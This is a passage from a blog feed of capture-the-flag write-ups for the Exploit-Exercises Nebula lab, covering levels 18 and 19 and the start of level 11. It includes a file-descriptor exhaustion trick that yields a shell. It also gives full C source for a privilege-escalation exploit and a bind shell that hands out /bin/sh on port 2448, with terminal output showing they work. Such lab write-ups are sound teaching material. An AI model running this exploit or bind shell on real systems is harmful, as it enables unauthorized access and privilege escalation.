<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ help ulimit
</span><span class='line'>[..snip..] 
</span><span class='line'>      -n        the maximum number of open file descriptors
</span><span class='line'>[..snip..] 
</span><span class='line'>
</span><span class='line'>sh-4.2$ ulimit -n 8
</span><span class='line'>
</span><span class='line'>sh-4.2$ /home/flag18/flag18 -d /dev/tty -vvv
</span><span class='line'>Starting up. Verbose level = 3
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully (without password file)
</span><span class='line'>closelog
</span><span class='line'>got [closelog] as input
</span><span class='line'>shell
</span><span class='line'>/home/flag18/flag18: -d: invalid option
</span><span class='line'>Usage:  /home/flag18/flag18 [GNU long option] [option] ...
</span><span class='line'>        /home/flag18/flag18 [GNU long option] [option] script-file ...
</span><span class='line'>GNU long options:
</span><span class='line'>        --debug
</span><span class='line'>        --debugger
</span><span class='line'>        --dump-po-strings
</span><span class='line'>        --dump-strings
</span><span class='line'>        --help
</span><span class='line'>        --init-file
</span><span class='line'>        --login
</span><span class='line'>        --noediting
</span><span class='line'>        --noprofile
</span><span class='line'>        --norc
</span><span class='line'>        --posix
</span><span class='line'>        --protected
</span><span class='line'>        --rcfile
</span><span class='line'>        --restricted
</span><span class='line'>        --verbose
</span><span class='line'>        --version
</span><span class='line'>Shell options:
</span><span class='line'>        -irsD or -c command or -O shopt_option          (invocation only)
</span><span class='line'>        -abefhkmnptuvxBCHP or -o option</span></code></pre></td></tr></table></div></figure>


<p>We used <code>closelog</code> to close one used descriptor and the shell is invoked,
unfortunately we need to get rid of -d parameter too, bash is recycling
our argv, see <code>execve("/bin/sh", argv, envp);</code>.</p>

<p>We tried <code>--init-file</code> as it has the second argument some file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ ulimit -n 5
</span><span class='line'>
</span><span class='line'>sh-4.2$ /home/flag18/flag18 --init-file -d /dev/tty -vvv
</span><span class='line'>/home/flag18/flag18: invalid option -- '-'
</span><span class='line'>/home/flag18/flag18: invalid option -- 'i'
</span><span class='line'>/home/flag18/flag18: invalid option -- 'n'
</span><span class='line'>/home/flag18/flag18: invalid option -- 'i'
</span><span class='line'>/home/flag18/flag18: invalid option -- 't'
</span><span class='line'>/home/flag18/flag18: invalid option -- '-'
</span><span class='line'>/home/flag18/flag18: invalid option -- 'f'
</span><span class='line'>/home/flag18/flag18: invalid option -- 'i'
</span><span class='line'>/home/flag18/flag18: invalid option -- 'l'
</span><span class='line'>/home/flag18/flag18: invalid option -- 'e'
</span><span class='line'>Starting up. Verbose level = 3
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>login
</span><span class='line'>got [login] as input
</span><span class='line'>attempting to login
</span><span class='line'>logged in successfully (without password file)
</span><span class='line'>closelog
</span><span class='line'>got [closelog] as input
</span><span class='line'>shell
</span><span class='line'>id
</span><span class='line'>uid=981(flag18) gid=1019(level18) groups=981(flag18),1019(level18)
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<p>Second way is to use format string exploitation, line 48 is vulnerable at <code>notsupported()</code> function.</p>

<p>For debugging, we downloaded <code>gdb-peda</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git clone https://github.com/longld/peda.git ~/peda
</span><span class='line'>echo "source ~/peda/peda.py" >> ~/.gdbinit</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/tmp$ gdb -q /home/flag18/flag18 
</span><span class='line'>Reading symbols from /home/flag18/flag18...(no debugging symbols found)...done.
</span><span class='line'>
</span><span class='line'>gdb-peda$ checksec 
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : ENABLED
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partial</span></code></pre></td></tr></table></div></figure>


<p>Because the Fortify2, there was no easy way to solve it, technique from
<a href="http://phrack.org/issues/67/9.html">phrack #67</a> could be very useful.</p>

<p>There is also buffer overflow in <code>setuser()</code> function, that doesn&rsquo;t seem to be exploitable.</p>

<h2>Level19</h2>

<figure class='code'><figcaption><span>level19.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">pid_t</span> <span class="n">pid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;/proc/%d&quot;</span><span class="p">,</span> <span class="n">getppid</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* stat() it */</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to check parent process</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* check the owner id */</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="cm">/* If root started us, it is ok to start the shell */</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to execve&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You are unauthorized to run this program</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>To pass the last challenge, our process parent id should match uid 0. This
could be easily achieved when the parent dies and the orphan process is adopted
by init.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 wait
</span><span class='line'>
</span><span class='line'>  A child that terminates, but has not been waited for becomes a "zombie".  The
</span><span class='line'>  kernel maintains a minimal set of information about the zombie process (PID,
</span><span class='line'>  termination status, resource usage information) in order to allow the parent to
</span><span class='line'>  later perform a wait to obtain information about the child.  As long as a
</span><span class='line'>  zombie  is  not  removed from  the  system  via a wait, it will consume a slot
</span><span class='line'>  in the kernel process table, and if this table fills, it will not be possible
</span><span class='line'>  to create further processes.  If a parent process terminates, then its "zombie"
</span><span class='line'>  children (if any) are adopted by init(8), which automatically performs a wait
</span><span class='line'>  to remove the zombies.</span></code></pre></td></tr></table></div></figure>


<p>Exploit:</p>

<figure class='code'><figcaption><span>exploit19.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">pid_t</span> <span class="n">childpid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">childpid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* child */</span>
</span><span class='line'>        <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;/home/flag19/flag19&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="s">&quot;/tmp/bindshell&quot;</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span><span class='line'>        <span class="n">execv</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Binding shell to port 2448, binary will be called from exploit.</p>

<figure class='code'><figcaption><span>bindshell.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">sockfd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">clientfd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">socklen_t</span> <span class="n">cli_len</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">srv_addr</span><span class="p">;</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">cli_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>        <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">2448</span><span class="p">);</span>
</span><span class='line'>        <span class="n">srv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">srv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">srv_addr</span><span class="p">));</span>
</span><span class='line'>        <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* accept new connections */</span>
</span><span class='line'>        <span class="n">cli_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cli_addr</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">cli_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cli_len</span> <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="cm">/* replace 0 with clientfd */</span>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>        <span class="cm">/* replace stdout &amp; stderr */</span>
</span><span class='line'>        <span class="n">dup2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cd /tmp
</span><span class='line'>
</span><span class='line'>sh-4.2$ gcc bindshell.c -o bindshell
</span><span class='line'>
</span><span class='line'>sh-4.2$ gcc exploit19.c -o exploit19
</span><span class='line'>
</span><span class='line'>sh-4.2$ ./exploit19 
</span><span class='line'>
</span><span class='line'>sh-4.2$ nc 0 2448
</span><span class='line'>id
</span><span class='line'>uid=980(flag19) gid=1020(level19) groups=980(flag19),1020(level19)
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (11-15)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/18/exploit-exercises-nebula-11-15/"/>
    <updated>2015-06-18T19:13:09+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/18/exploit-exercises-nebula-11-15</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level11</h2>

<p>According to the assignment, there should be two ways how to exploit the source below.</p>

<figure class='code'><figcaption><span>level11.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Return a random, non predictable file, and return the file descriptor for it.</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">path</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;TEMP&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;%s/%d.%c%c%c%c%c%c&quot;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span>
</span><span class='line'>      <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span>
</span><span class='line'>      <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
</span><span class='line'>      <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
</span><span class='line'>  <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>      <span class="n">key</span> <span class="o">-=</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define CL &quot;Content-Length: &quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
